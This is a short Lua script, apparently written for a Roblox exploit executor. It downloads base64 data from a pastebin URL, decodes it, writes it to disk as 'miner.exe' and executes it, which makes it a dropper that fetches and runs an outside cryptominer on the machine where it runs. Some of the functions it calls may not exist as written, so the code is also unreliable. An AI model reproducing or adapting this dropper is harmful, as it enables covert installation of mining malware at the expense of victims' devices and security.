local base64 = game:HttpGet("https://pastebin.com/raw/XXXXX")
local file = "C:\\temp\\miner.exe"
writefile(file, game:GetService("HttpService"):Base64Decode(base64))
syn.execute(file)
